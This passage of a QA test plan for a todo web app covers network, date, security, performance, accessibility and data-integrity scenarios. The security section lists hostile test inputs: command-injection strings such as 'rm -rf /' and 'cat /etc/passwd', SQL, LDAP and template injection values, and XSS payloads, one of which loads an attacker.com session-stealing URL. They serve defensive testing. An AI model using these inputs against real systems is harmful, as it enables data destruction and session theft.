  - See SC-AUTH-004 for XSS details

---

### 3.2 Network & Offline Scenarios

#### Scenario: SC-EDGE-012 | Network Timeout During Task Create
- **Steps**:
  1. Start creating a task
  2. Simulate network failure (disconnect WiFi/Ethernet)
  3. Click Save
  4. Observe behavior
- **Expected Outcome**: 
  - Error message: "Network error - please try again"
  - Task form data NOT lost (persisted in localStorage)
  - User can retry after reconnecting
  - No duplicate task created on retry
  - Clear state management

#### Scenario: SC-EDGE-013 | Offline Mode - Create Task
- **Steps**:
  1. Enable offline mode (disable network in browser dev tools)
  2. Try to create new task
- **Expected Outcome**: 
  - Clear indication: "You're offline"
  - Option to create task locally (queued for sync)
  - OR prevent creation with message: "Go online to create tasks"
  - Depends on app's offline capability design

#### Scenario: SC-EDGE-014 | Offline Mode - Edit & Sync
- **Steps**:
  1. Load app online
  2. Go offline
  3. Edit existing task (cached locally)
  4. Go back online
  5. Observe sync behavior
- **Expected Outcome**: 
  - Changes queued locally
  - Sync indicator shows pending changes
  - On reconnect, changes synced to server
  - Conflicts handled (last-write-wins or user choice)
  - UI confirms sync success
  - No data loss

#### Scenario: SC-EDGE-015 | Server Unavailability - Graceful Degradation
- **Steps**:
  1. Simulate server down (network timeout)
  2. Try to perform any action (create, edit, filter)
- **Expected Outcome**: 
  - Error message: "Server is unavailable, please try again later"
  - Suggestions: "Or work offline"
  - No "Internal Server Error" leaking technical details
  - Retry button available
  - User experience preserved (don't break the app entirely)

#### Scenario: SC-EDGE-016 | Slow Network - Large File Upload (if applicable)
- **Steps**:
  1. If app supports attachments: Upload large file on slow network
  2. Simulate 56k modem speed
  3. Monitor progress bar
- **Expected Outcome**: 
  - Progress bar shows accurate upload %
  - User can cancel upload
  - Timeout not too aggressive (allow 30+ seconds for large files)
  - Resume upload if interrupted (advanced feature)
  - Clear status message

#### Scenario: SC-EDGE-017 | Rapid API Calls - Rate Limiting Client-Side
- **Steps**:
  1. Rapidly click "Create Task" button 10+ times
  2. Check API requests
- **Expected Outcome**: 
  - Client debounces or throttles requests
  - Only legitimate requests sent (not all 10+)
  - Button disabled during request (visual feedback)
  - Prevents server overload
  - Max 1 request per 500ms for creation

#### Scenario: SC-EDGE-018 | Response Size - Very Large Task Description
- **Steps**:
  1. Create task with description: 1MB of text
  2. Load task
  3. Check network waterfall
- **Expected Outcome**: 
  - API accepts and stores (size limits enforced)
  - Response time reasonable (<5 seconds)
  - No memory leaks on display
  - Pagination if many tasks
  - Efficient caching

---

### 3.3 Time-Related Edge Cases

#### Scenario: SC-EDGE-019 | Task Due - End of Month
- **Steps**:
  1. Create task due: `2025-01-31` (last day of month)
  2. Check filters: "Due this month"
  3. Next day (Feb 1): Task should show as overdue
- **Expected Outcome**: 
  - Task correctly marked as overdue on Feb 1
  - Month boundary handled correctly
  - No off-by-one date errors
  - Comparison logic: `today > due_date`

#### Scenario: SC-EDGE-020 | Year Boundary - New Year Task
- **Steps**:
  1. Create task on 2024-12-31 due: 2025-01-01
  2. Refresh on Jan 1, 2025
- **Expected Outcome**: 
  - Task appears as due today (2025-01-01)
  - No year comparison issues
  - Task correctly shows in "Due today" filter
  - Visual indicator for today's date correct

#### Scenario: SC-EDGE-021 | Recurring Task - Year Boundary
- **Steps**:
  1. Create annual recurring task: `2024-12-31` due `2025-12-31`
  2. Check next occurrence after `2025-12-31`
- **Expected Outcome**: 
  - Next instance: `2026-12-31`
  - No issues crossing year boundary
  - Recurring pattern unaffected

#### Scenario: SC-EDGE-022 | Clock Skew - System Time Wrong
- **Steps**:
  1. Set local system time wrong (e.g., 2030 instead of 2025)
  2. Use app normally
  3. Correct system time
  4. Reload app
- **Expected Outcome**: 
  - App uses server time (not client time) for "today"
  - Tasks show correct due dates
  - Overdue tasks correct after system time fixed
  - No permanent damage from temporary time skew

#### Scenario: SC-EDGE-023 | Millisecond Precision - Task Timestamps
- **Steps**:
  1. Create 2 tasks rapidly (within milliseconds)
  2. Query database: Check created_at timestamps
- **Expected Outcome**: 
  - Both tasks have different timestamps (not identical)
  - Millisecond precision preserved if stored
  - Correct ordering by creation time
  - No duplicate timestamps causing ordering confusion

---

## 4. SECURITY TESTING

### 4.1 Access Control & Authorization (OWASP A01)

#### Scenario: SC-SEC-001 | IDOR - Direct Object Reference (Insecure)
- **Steps**:
  1. Login as User A, create task ID `123`
  2. Capture request: `GET /api/tasks/123`
  3. Logout and login as User B
  4. Make request: `GET /api/tasks/123` (User A's task ID)
- **Expected Outcome**: 
  - PASS: HTTP 403 "Forbidden" or HTTP 404 "Not Found"
  - User B cannot access User A's data
  - Server validates task ownership before returning
  - Logging records unauthorized access attempts

#### Scenario: SC-SEC-002 | IDOR - Edit Other User's Task
- **Steps**:
  1. User A has task ID `100`
  2. User B makes request: `PUT /api/tasks/100 {name: "Hacked"}`
- **Expected Outcome**: 
  - FAIL: Request rejected, HTTP 403
  - Task not modified
  - Authorization check on server before update

#### Scenario: SC-SEC-003 | IDOR - Delete Other User's Task
- **Steps**:
  1. User A has task ID `100`
  2. User B makes request: `DELETE /api/tasks/100`
- **Expected Outcome**: 
  - FAIL: Request rejected, HTTP 403
  - Task not deleted
  - Data integrity preserved

#### Scenario: SC-SEC-004 | IDOR - Access Other User's Lists
- **Steps**:
  1. User A creates list ID `50`
  2. User B makes request: `GET /api/lists/50`
- **Expected Outcome**: 
  - FAIL: HTTP 403 or 404
  - User B cannot view User A's list

#### Scenario: SC-SEC-005 | Privilege Escalation - Admin Endpoint Access
- **Steps**:
  1. Login as regular user
  2. Try to access: `GET /api/admin/users` or `DELETE /api/tasks/all`
  3. Or try to add parameter: `?is_admin=true`
- **Expected Outcome**: 
  - FAIL: HTTP 403 "Forbidden"
  - Admin endpoints require proper authentication/authorization
  - Parameter tampering doesn't elevate privileges
  - Role-based access control enforced

#### Scenario: SC-SEC-006 | Missing Authorization Checks
- **Steps**:
  1. Intercept requests and remove JWT token
  2. Make API call
- **Expected Outcome**: 
  - FAIL: HTTP 401 "Unauthorized"
  - All protected endpoints require valid token
  - No data returned without authentication

#### Scenario: SC-SEC-007 | HTTP Method Confusion
- **Steps**:
  1. Task creation protected: `POST /api/tasks`
  2. Try alternative method: `GET /api/tasks` (with body parameters)
  3. Try: `PUT /api/tasks` (instead of POST)
- **Expected Outcome**: 
  - FAIL: Only POST works for creation
  - Other methods rejected or not allowed
  - Server validates expected HTTP method

---

### 4.2 Injection Attacks (OWASP A03)

#### Scenario: SC-SEC-008 | SQL Injection - Comment/Metadata Field
- **Steps**:
  1. Create task with name: `task' OR '1'='1`
- **Expected Outcome**: 
  - String treated as literal text
  - Parameterized queries prevent SQL injection
  - No database compromise
  - See SC-EDGE-010 for SQL injection tests

#### Scenario: SC-SEC-009 | Command Injection (If Backend Calls System Commands)
- **Steps**:
  1. Task name: `test; rm -rf /` or `test && cat /etc/passwd`
  2. Check if any file system operations happen
- **Expected Outcome**: 
  - No system commands executed
  - String stored as-is
  - Backend doesn't shell out with user input
  - No file system access

#### Scenario: SC-SEC-010 | LDAP Injection (If LDAP Used for Auth)
- **Steps**:
  1. Username: `admin*`
  2. Or: `*)(uid=*))(|(uid=*`
- **Expected Outcome**: 
  - Treated as literal string
  - LDAP queries use parameterized inputs
  - No authentication bypass

#### Scenario: SC-SEC-011 | Template Injection (If App Uses Templates)
- **Steps**:
  1. Task name: `{{7*7}}`
  2. Or: `${7*7}`
  3. Or: `<%= 7*7 %>`
  4. Check if math is evaluated (49) or literal
- **Expected Outcome**: 
  - Displayed literally: `{{7*7}}` (not 49)
  - No server-side template injection
  - No code execution

---

### 4.3 XSS Vulnerabilities (OWASP A03)

#### Scenario: SC-SEC-012 | Stored XSS - Task Name
- **Steps**:
  1. Create task: `<img src=x onerror="alert('Stored XSS')">`
  2. Reload page
  3. Alert should NOT appear
- **Expected Outcome**: 
  - HTML tags escaped: `&lt;img src=x onerror=...&gt;`
  - No JavaScript execution
  - Displayed as safe text

#### Scenario: SC-SEC-013 | Stored XSS - Task Description
- **Steps**:
  1. Create task with description: `<iframe src="https://attacker.com/steal-session"></iframe>`
  2. Reload page
- **Expected Outcome**: 
  - Iframe tag escaped
  - No external resource loaded
  - Malicious site not contacted

#### Scenario: SC-SEC-014 | Reflected XSS - Search Parameter
- **Steps**:
  1. Search for: `<img src=x onerror="alert('Reflected XSS')">`
  2. Check URL: `/tasks?search=<img src=x onerror=...>`
  3. If search results display the search term, check if escaped
- **Expected Outcome**: 
  - Search term displayed safely
  - HTML encoded if shown
  - No alert appears
  - Safe redisplay of user input

#### Scenario: SC-SEC-015 | DOM-Based XSS
- **Steps**:
  1. If app reads URL parameters with JavaScript:
     - URL: `/tasks#search=<img src=x onerror="alert('XSS')">`
  2. Check if React/framework safely renders the search param
- **Expected Outcome**: 
  - Parameter treated as text, not HTML
  - React auto-escapes by default (safer)
  - No XSS execution

#### Scenario: SC-SEC-016 | SVG-based XSS (Advanced)
- **Steps**:
  1. Task name: `<svg onload="alert('SVG XSS')">`
  2. Or description: `<svg><script>alert('SVG XSS')</script></svg>`
- **Expected Outcome**: 
  - SVG tags escaped or stripped
  - No onload execution
  - No embedded scripts run

#### Scenario: SC-SEC-017 | Event Handler Bypass
- **Steps**:
  1. Task name: `<div onmouseover="alert('XSS')">Hover me</div>`
  2. Try to hover over task in UI
- **Expected Outcome**: 
  - Div tags escaped: `&lt;div onmouseover=...&gt;`
  - No event handler attached
  - Hovering doesn't trigger anything

---

### 4.4 Cryptography & Data Protection (OWASP A02)

#### Scenario: SC-SEC-018 | JWT Token Exposed in Logs
- **Steps**:
  1. Check application logs, server logs, browser console
  2. Look for JWT tokens being logged
- **Expected Outcome**: 
  - Tokens NEVER logged in plaintext
  - Sensitive data not exposed in logs
  - Log sanitization implemented
  - No tokens in error messages

#### Scenario: SC-SEC-019 | HTTPS Not Enforced
- **Steps**:
  1. Try to access app via HTTP: `http://todoapp.com`
- **Expected Outcome**: 
  - Redirect to HTTPS: `https://todoapp.com`
  - HSTS header sent: `Strict-Transport-Security: max-age=31536000`
  - No unencrypted transmission of credentials
  - All cookies have Secure flag

#### Scenario: SC-SEC-020 | Sensitive Data in URL
- **Steps**:
  1. Check URLs for tokens, passwords, user IDs
  2. Example bad: `/tasks?user_id=123&token=abc123`
- **Expected Outcome**: 
  - Sensitive data NOT in URLs
  - Tokens in request headers or secure cookies only
  - User IDs derived from authenticated session
  - No sensitive data in query parameters

#### Scenario: SC-SEC-021 | Password Storage - Hashing
- **Steps**:
  1. Access database directly (if possible for testing)
  2. Attempt to view user passwords
- **Expected Outcome**: 
  - Passwords NOT stored in plaintext
  - Passwords hashed with bcrypt, Argon2, or similar
  - Salt used (minimum 32 bits)
  - Hashes cannot be reversed

#### Scenario: SC-SEC-022 | Cache Control Headers
- **Steps**:
  1. Login to app
  2. Inspect HTTP response headers
  3. Look for: `Cache-Control`, `Pragma`
- **Expected Outcome**: 
  - `Cache-Control: no-store, no-cache, must-revalidate`
  - `Pragma: no-cache`
  - Sensitive pages not cached by browser
  - Prevent cached pages visible after logout

---

### 4.5 Rate Limiting & Brute Force Protection

#### Scenario: SC-SEC-023 | Login Brute Force - 10 Attempts
- **Steps**:
  1. Try login with wrong password: 10 times rapidly
  2. Observe responses
- **Expected Outcome**: 
  - Attempts 1-5: Return 401 "Unauthorized"
  - Attempt 6: HTTP 429 "Too Many Requests"
  - Account locked/IP blocked for 15 minutes
  - User notified: "Too many login attempts, try again later"
  - Legitimate user can reset lockout via email

#### Scenario: SC-SEC-024 | Password Reset Request - Rate Limiting
- **Steps**:
  1. Request password reset: 5 times in 5 seconds
  2. Check 6th request
- **Expected Outcome**: 
  - Requests 1-3: Processed normally (email sent)
  4. Request 4+: Rejected with HTTP 429
  - Rate limit: Max 3 per email per 24 hours
  - IP address rate limited: Max 10 per IP per 24 hours

#### Scenario: SC-SEC-025 | API Rate Limiting - Rapid Requests
- **Steps**:
  1. Send 100 requests per second to API
  2. Use artillery or Apache Bench
  3. Monitor responses
- **Expected Outcome**: 
  - Initial requests: HTTP 200
  - After threshold (e.g., 60 per minute): HTTP 429
  - Rate limit headers sent:
     - `X-RateLimit-Limit: 60`
     - `X-RateLimit-Remaining: 0`
     - `Retry-After: 60`
  - Clear feedback to client
  - User/IP blocked temporarily

#### Scenario: SC-SEC-026 | 2FA Code Brute Force
- **Steps**:
  1. If 2FA enabled, attempt to guess code: 1000 times
- **Expected Outcome**: 
  - Code is 6 digits (1M possibilities)
  - After 5 wrong attempts: Require new code
  - After 10 wrong attempts: Lock account
  - Rate limit: 1 code attempt per 5 seconds
  - Codes expire after 5 minutes

---

### 4.6 Session & Token Management

#### Scenario: SC-SEC-027 | Cookie Flags - HttpOnly
- **Steps**:
  1. Login
  2. Inspect cookies in browser dev tools
  3. Check auth cookie properties
- **Expected Outcome**: 
  - Auth cookie has `HttpOnly` flag set
  - Cookie NOT accessible via JavaScript
  - Reduces XSS damage potential
  - Note: Current app uses localStorage (not cookies), which is less secure

#### Scenario: SC-SEC-028 | Cookie Flags - Secure
- **Steps**:
  1. Check auth cookie (if applicable)
  2. Verify `Secure` flag
- **Expected Outcome**: 
  - `Secure` flag set
  - Cookie only sent over HTTPS
  - No plaintext transmission over HTTP

#### Scenario: SC-SEC-029 | Cookie Flags - SameSite
- **Steps**:
  1. Check auth cookie
  2. Verify `SameSite` attribute
- **Expected Outcome**: 
  - `SameSite=Strict` or `SameSite=Lax`
  - CSRF attack prevention
  - Cross-site form submission rejected

#### Scenario: SC-SEC-030 | Token Expiration - Access Token
- **Steps**:
  1. Decode JWT and check `exp` claim
  2. Calculate expiration
- **Expected Outcome**: 
  - Access token expires in 15-60 minutes
  - Short-lived token reduces exposure
  - Refresh token used to get new access token
  - Expiration enforced by server (not just client)

#### Scenario: SC-SEC-031 | Session Fixation
- **Steps**:
  1. Get JWT token before login
  2. Attempt to use pre-login token for authenticated requests
- **Expected Outcome**: 
  - Pre-login token doesn't work
  - Session ID/token changes on login
  - No session fixation vulnerability

---

### 4.7 Error Handling & Information Disclosure

#### Scenario: SC-SEC-032 | Error Messages - No Stack Traces
- **Steps**:
  1. Trigger errors: Invalid input, server errors, 404s
  2. Check error responses
- **Expected Outcome**: 
  - Generic error messages: "Something went wrong"
  - NO stack traces or technical details
  - NO database error messages: "SQL syntax error near..."
  - NO file paths: "/home/user/app/tasks.js"
  - NO version info: "Node.js v18.0.0"

#### Scenario: SC-SEC-033 | 404 Handling - Info Disclosure
- **Steps**:
  1. Request non-existent endpoint: `/api/admin-secret`
  2. Request non-existent task: `GET /api/tasks/999999`
- **Expected Outcome**: 
  - Generic 404: "Not found"
  - NO message revealing list of valid endpoints
  - NO message: "Task 999999 does not exist for user 123" (user enumeration)

#### Scenario: SC-SEC-034 | Detailed Error for User Actions
- **Steps**:
  1. Try to delete someone else's task: `DELETE /api/tasks/OTHER_USER_ID`
  2. Check error message
- **Expected Outcome**: 
  - Generic: "Not found" (HTTP 404)
  - NOT: "Task belongs to user 456, unauthorized" (reveals owner info)

#### Scenario: SC-SEC-035 | Error Logging - Sensitive Data Not Logged
- **Steps**:
  1. Trigger error with sensitive input (password, token)
  2. Check logs (if accessible)
- **Expected Outcome**: 
  - Request bodies NOT fully logged
  - Passwords/tokens redacted
  - PII masked in logs
  - Log access restricted to authorized admins

---

## 5. PERFORMANCE & LOAD TESTING

### 5.1 Response Time

#### Scenario: SC-PERF-001 | Task List Load Time - 100 Tasks
- **Steps**:
  1. Create 100 tasks
  2. Load dashboard
  3. Measure time from click to full page render
  4. Use DevTools Performance tab
- **Expected Outcome**: 
  - Page load: <2 seconds (Time to Interactive)
  - First paint: <1 second
  - No blocking scripts
  - Optimized asset delivery

#### Scenario: SC-PERF-002 | Task Creation - API Response
- **Steps**:
  1. Create a task and time API response
  2. Use Network tab to measure
- **Expected Outcome**: 
  - API response: <500ms
  - Database insert: <200ms
  - Network round trip: <100ms
  - No noticeable lag in UI

#### Scenario: SC-PERF-003 | Search - 1000 Tasks
- **Steps**:
  1. Create 1000 tasks
  2. Search for keyword
  3. Measure search result time
- **Expected Outcome**: 
  - Results displayed within 1 second
  - No client-side lag
  - Server-side search optimized (indexed if needed)
  - Pagination or lazy loading for large result sets

#### Scenario: SC-PERF-004 | Filter - Large Dataset
- **Steps**:
  1. Apply multiple filters simultaneously: Priority + Status + List + Due Date
  2. On 1000 task dataset
  3. Measure response time
- **Expected Outcome**: 
  - Filters applied within 1 second
  - Smooth UI experience
  - No full page re-render
  - Efficient database queries

#### Scenario: SC-PERF-005 | Pagination Performance
- **Steps**:
  1. Create 10,000 tasks
  2. Load page 1 (first 20 tasks): Measure time
  3. Navigate to page 100: Measure time
  4. Navigate to page 500: Measure time
- **Expected Outcome**: 
  - Each page load: <1 second
  - No exponential slowdown
  - Consistent performance across pages
  - Database efficiently queries pagination (LIMIT + OFFSET)

---

### 5.2 Memory & Resource Usage

#### Scenario: SC-PERF-006 | Memory Leak - Long Session
- **Steps**:
  1. Open browser DevTools (Memory tab)
  2. Take heap snapshot
  3. Use app for 30 minutes: Create, edit, delete tasks
  4. Take another heap snapshot
  5. Compare memory usage
- **Expected Outcome**: 
  - Garbage collection working (memory spikes then drops)
  - Stable memory baseline after GC
  - No continuous memory growth
  - Detached DOM nodes cleaned up

#### Scenario: SC-PERF-007 | Memory - 10,000 Task Render
- **Steps**:
  1. Load 10,000 tasks in single view
  2. Monitor memory usage
  3. Check if browser becomes unresponsive
- **Expected Outcome**: 
  - Virtual scrolling or pagination used
  - Only visible tasks rendered
  - Memory usage stays reasonable (<200MB)
  - Browser remains responsive
  - Scroll is smooth

#### Scenario: SC-PERF-008 | CSS & JS Bundle Size
- **Steps**:
  1. Check network tab
  2. Sum all JavaScript and CSS file sizes
- **Expected Outcome**: 
  - Total JS <500KB (gzipped)
  - Total CSS <100KB (gzipped)
  - Efficient code splitting
  - No unused dependencies

#### Scenario: SC-PERF-009 | Image/Asset Optimization
- **Steps**:
  1. Check all images loaded
  2. Use Lighthouse audit
- **Expected Outcome**: 
  - Images responsive and optimized
  - No oversized images
  - WebP format used where supported
  - Lighthouse score >90

---

### 5.3 Concurrency & Load

#### Scenario: SC-PERF-010 | Concurrent Users - 100 Creating Tasks
- **Steps**:
  1. Simulate 100 concurrent users
  2. Each creates 1 task simultaneously
  3. Monitor server response time and errors
- **Expected Outcome**: 
  - All 100 tasks created successfully
  - No "503 Service Unavailable"
  - Response time <1 second each
  - Database handles concurrent writes
  - No deadlocks

#### Scenario: SC-PERF-011 | Concurrent Users - 1000 Viewing Tasks
- **Steps**:
  1. Simulate 1000 concurrent users
  2. All viewing their task list simultaneously
  3. Monitor server resources
- **Expected Outcome**: 
  - All users see data
  - Response time <2 seconds
  - Server CPU/Memory acceptable (<80%)
  - Database connections pooled efficiently
  - No timeouts

#### Scenario: SC-PERF-012 | Thundering Herd - Cache Expiration
- **Steps**:
  1. Cache set to expire at exact same time
  2. 1000 users refresh dashboard at same time
  3. Monitor cache and database load
- **Expected Outcome**: 
  - Cache stampede handled gracefully
  - Probabilistic early expiration or locks prevent overload
  - Database not overwhelmed
  - Performance degradation acceptable

---

## 6. USABILITY & EDGE CASE WORKFLOWS

### 6.1 Browser & Device Compatibility

#### Scenario: SC-USE-001 | Browser - Chrome Latest
- **Steps**:
  1. Test all core workflows in Chrome (latest version)
- **Expected Outcome**: 
  - All features functional
  - No console errors
  - Responsive design works

#### Scenario: SC-USE-002 | Browser - Firefox Latest
- **Steps**:
  1. Test all workflows in Firefox
- **Expected Outcome**: 
  - Consistent with Chrome
  - No browser-specific bugs

#### Scenario: SC-USE-003 | Browser - Safari Latest
- **Steps**:
  1. Test all workflows in Safari
- **Expected Outcome**: 
  - Consistent experience
  - Date picker works (known Safari issues)
  - Responsive design optimized

#### Scenario: SC-USE-004 | Browser - Edge Latest
- **Steps**:
  1. Basic functionality test
- **Expected Outcome**: 
  - All features work

#### Scenario: SC-USE-005 | Mobile - iOS Safari
- **Steps**:
  1. Test on iPhone/iPad
  2. Test touch interactions
  3. Test date picker
- **Expected Outcome**: 
  - Responsive mobile layout
  - Touch-friendly buttons
  - Date picker native to iOS
  - No horizontal scrolling

#### Scenario: SC-USE-006 | Mobile - Android Chrome
- **Steps**:
  1. Test on Android device
  2. Test native date picker
  3. Test keyboard interactions
- **Expected Outcome**: 
  - Responsive layout
  - Native Android date picker
  - Keyboard supports task entry
  - No layout breaks

#### Scenario: SC-USE-007 | Tablet - iPad Landscape
- **Steps**:
  1. Test on iPad in landscape mode
  2. Test two-column layout (if applicable)
- **Expected Outcome**: 
  - Layout optimized for wider screen
  - Two-column design if appropriate
  - No cut-off content

#### Scenario: SC-USE-008 | Accessibility - Keyboard Navigation
- **Steps**:
  1. Tab through entire app
  2. Navigate task list: Arrow keys
  3. Open dialog: Enter key
  4. Close dialog: Escape key
- **Expected Outcome**: 
  - All interactive elements reachable via keyboard
  - Tab order logical (top-to-bottom, left-to-right)
  - Focus indicators visible
  - No keyboard traps (stuck unable to exit)

#### Scenario: SC-USE-009 | Accessibility - Screen Reader
- **Steps**:
  1. Use screen reader (NVDA, JAWS, VoiceOver)
  2. Navigate app
  3. Read task names, instructions, buttons
- **Expected Outcome**: 
  - Page structure announced properly
  - Form labels associated with inputs
  - Buttons have accessible names
  - Task status announced: "checkbox marked, completed"
  - Dynamic content updates announced
  - ARIA labels used appropriately

#### Scenario: SC-USE-010 | Accessibility - Color Contrast
- **Steps**:
  1. Use Lighthouse audit or WebAIM contrast checker
  2. Check all text colors vs. background
- **Expected Outcome**: 
  - WCAG AA compliance: 4.5:1 contrast ratio
  - Red/green not sole indicators (colorblind users)
  - Text readable in high contrast mode

---

### 6.2 Data Import/Export

#### Scenario: SC-USE-011 | Export Tasks - CSV Format
- **Steps**:
  1. Create 5 tasks with varied properties
  2. Export as CSV
  3. Open in Excel/Google Sheets
- **Expected Outcome**: 
  - CSV contains: ID, Name, Priority, Due Date, Status, List
  - All data included correctly
  - No encoding issues
  - Proper escaping of commas/quotes

#### Scenario: SC-USE-012 | Export Tasks - JSON Format
- **Steps**:
  1. Export as JSON
  2. Parse JSON to verify structure
- **Expected Outcome**: 
  - Valid JSON format
  - All task properties included
  - Can be re-imported or used by other tools

#### Scenario: SC-USE-013 | Import Tasks - CSV Upload
- **Steps**:
  1. Create CSV file with 10 tasks
  2. Upload via import dialog
  3. Verify all tasks created
- **Expected Outcome**: 
  - Tasks bulk-created from CSV
  - All fields mapped correctly
  - Duplicates handled (not created twice)
  - Error rows identified clearly

#### Scenario: SC-USE-014 | Import Tasks - Duplicate Handling
- **Steps**:
  1. Import CSV with duplicate task names
  2. Check import behavior
- **Expected Outcome**: 
  - Duplicates created (app allows same task name)
  - OR user warned about duplicates
  - Depends on app requirements

#### Scenario: SC-USE-015 | Import Tasks - Invalid Data
- **Steps**:
  1. Create CSV with:
     - Missing required field (name)
     - Invalid priority: "Super High"
     - Invalid date: "not-a-date"
  2. Import
- **Expected Outcome**: 
  - Import partially succeeds
  - Invalid rows identified
  - Error report generated
  - Valid rows imported
  - User can fix and retry invalid rows

---

### 6.3 Real-world User Scenarios

#### Scenario: SC-USE-016 | User Journey - New User Onboarding
- **Steps**:
  1. New user visits app
  2. Signs up
  3. Verifies email
  4. Creates first list: "Today"
  5. Adds 5 tasks
  6. Marks 2 complete
  7. Logs out and back in
- **Expected Outcome**: 
  - Smooth onboarding
  - Welcome/tutorial appears (optional)
  - Tasks persist after logout/login
  - No data loss
  - User feels guided

#### Scenario: SC-USE-017 | User Journey - Bulk Task Entry
- **Steps**:
  1. User wants to quickly enter 20 tasks
  2. Uses quick-add: Type task name, press Enter to create, stays in input
  3. Creates 20 tasks in 2 minutes
- **Expected Outcome**: 
  - Quick-add form available
  - Focus remains in input after creation
  - 20 tasks created successfully
  - User experience optimized for speed

#### Scenario: SC-USE-018 | User Journey - Task Management Workflow
- **Steps**:
  1. Morning: User checks "Due Today" filter
  2. Completes 3 tasks during the day
  3. Evening: Reviews "Completed" filter to feel accomplished
  4. Checks "Overdue" tasks to reschedule
  5. Adds new tasks for tomorrow
  6. Closes app
- **Expected Outcome**: 
  - All filters work smoothly
  - Completion satisfaction visible
  - Task state persists
  - Workflow feels natural

#### Scenario: SC-USE-019 | User Journey - Planning Weekly
- **Steps**:
  1. User opens "Due This Week" filter
  2. Reviews all week's tasks
  3. Prioritizes 3 "must-do" tasks (marks High priority)
  4. Adds recurring task: "Weekly review" for Sunday
  5. Deletes low-priority task from next week
- **Expected Outcome**: 
  - Filter shows correct week's tasks
  2. Priority changes reflected
  3. Recurring task created
  4. Deletion successful
  5. No side effects

---

## 7. DATA INTEGRITY & CONSISTENCY

### 7.1 Database Constraints

#### Scenario: SC-DATA-001 | Unique Constraint - Duplicate Email
- **Steps**:
  1. Attempt to register two accounts with same email
  2. Second registration should fail
- **Expected Outcome**: 
  - Database unique constraint enforced
  - Error message: "Email already registered"
  - No duplicate user records created
  - Data integrity maintained

#### Scenario: SC-DATA-002 | Foreign Key Constraint - Delete List
- **Steps**:
  1. Create list with 5 tasks
  2. Delete list without deleting tasks first
- **Expected Outcome**: 
  - Either:
    a) Cascade delete (list and tasks deleted)
    b) Prevent deletion ("List contains tasks")
  - No orphaned tasks with invalid list_id
  - Data integrity maintained
  - User experience clear

#### Scenario: SC-DATA-003 | NOT NULL Constraint - Required Fields
- **Steps**:
  1. Attempt to create task with NULL name (bypass client validation)
  2. Send API request: `{priority: "High"}` (no name)
- **Expected Outcome**: 
  - Server validation rejects
  - HTTP 400 "Bad Request"
  - No task created with NULL name
  - Database constraint prevents corruption

#### Scenario: SC-DATA-004 | Data Type Validation
- **Steps**:
  1. Send API request with wrong data types:
     - `{priority: "not-a-number"}`
     - `{due_date: 12345}` (should be string date)
     - `{is_completed: "yes"}` (should be boolean)
- **Expected Outcome**: 
  - Server validates types
  - Rejects invalid types with HTTP 400
  - Error message clear
  - No type coercion causing unexpected behavior

#### Scenario: SC-DATA-005 | Soft Delete - Data Recovery
- **Steps**:
  1. Create task
  2. Delete task (soft delete)
  3. Query database with admin access
  4. Check deleted_at timestamp
- **Expected Outcome**: 
  - Task marked deleted (deleted_at not NULL)
  - Task not visible to user
  - Can be recovered if needed
  - Hard delete after 30 days (or retention policy)

---

### 7.2 Transaction Integrity

#### Scenario: SC-DATA-006 | Atomic Task Update
- **Steps**:
  1. Update task: Name, Priority, Due Date, Status (all at once)
  2. Network fails mid-transaction
  3. Retry
- **Expected Outcome**: 
  - All fields updated together or not at all
  - No partial updates (name changes but due date doesn't)
  - Transaction rolled back on failure
  - Retry succeeds with all changes

#### Scenario: SC-DATA-007 | Bulk Operation Atomicity
- **Steps**:
  1. Delete 10 tasks simultaneously
  2. Network fails after 5 deleted
  3. Retry bulk delete
- **Expected Outcome**: 
  - Either all 10 deleted or none deleted
  - No partial deletion (5 deleted, 5 not)
  - OR clear state: "5 deleted, 5 failed"
  - Retry completes operation

---

## 8. SUMMARY & EXECUTION GUIDE

### Testing Priorities

**Critical (Must Pass):**
- Authentication & JWT security (SC-AUTH-*)
- Authorization checks (SC-SEC-001 to SC-SEC-007)
- XSS vulnerabilities (SC-SEC-012 to SC-SEC-017)
- SQL injection (SC-SEC-008, SC-EDGE-010)
- Task CRUD operations (SC-FUNC-001 to SC-FUNC-010)
- Email verification bypass (SC-AUTH-002)
- Password reset rate limiting (SC-AUTH-017 to SC-AUTH-020)

**High Priority:**
- Timezone handling (SC-EDGE-002, SC-FUNC-020)
- Recurring task edge cases (SC-FUNC-031, SC-FUNC-035)
- Rate limiting & brute force (SC-SEC-023 to SC-SEC-026)
- IDOR vulnerabilities (SC-SEC-001 to SC-SEC-004)
- Data consistency (SC-DATA-*)

**Medium Priority:**
- Performance testing (SC-PERF-*)
- Filter & search (SC-FUNC-036 to SC-FUNC-045)
- Accessibility (SC-USE-008 to SC-USE-010)
- Browser compatibility (SC-USE-001 to SC-USE-007)

**Nice to Have:**
- Import/export (SC-USE-011 to SC-USE-015)
- User journey workflows (SC-USE-016 to SC-USE-019)
- Offline sync (SC-EDGE-012 to SC-EDGE-017)

### Test Execution Approach

1. **Unit Testing**: Input validation, date logic, filters (developer-owned)
2. **Integration Testing**: API endpoints with database, auth flow
3. **Security Testing**: Manual + automated security scanning tools
4. **Load Testing**: Apache JMeter, Locust, k6 for concurrent user simulation
5. **Manual Functional Testing**: User workflows, UI interactions
6. **Accessibility Testing**: Screen reader, keyboard navigation
7. **Performance Testing**: Lighthouse, WebPageTest, DevTools profiling

### Tools Recommended

- **Security**: Burp Suite Community, OWASP ZAP, Snyk
- **Load Testing**: k6, Apache JMeter, Locust
- **Performance**: Lighthouse, WebPageTest, Chrome DevTools
- **API Testing**: Postman, REST Client, Thunder Client
- **Accessibility**: WAVE, axe DevTools, NVDA/JAWS

---

**Document Version**: 1.0  
**Last Updated**: January 2025  
**Applicable To**: TodoList React SPA with Node.js/Express REST API
